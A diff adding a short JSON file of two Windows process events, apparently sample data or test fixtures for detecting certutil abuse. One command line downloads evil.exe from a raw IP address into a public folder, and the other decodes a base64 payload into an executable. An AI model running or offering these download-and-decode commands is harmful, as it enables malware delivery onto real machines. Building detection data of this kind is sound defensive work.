@@ -1,0 +1,10 @@
+[
+  {
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f http://185.199.0.1/evil.exe C:\\Users\\Public\\evil.exe"
+  },
+  {
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -decode payload.b64 payload.exe"
+  }
+]
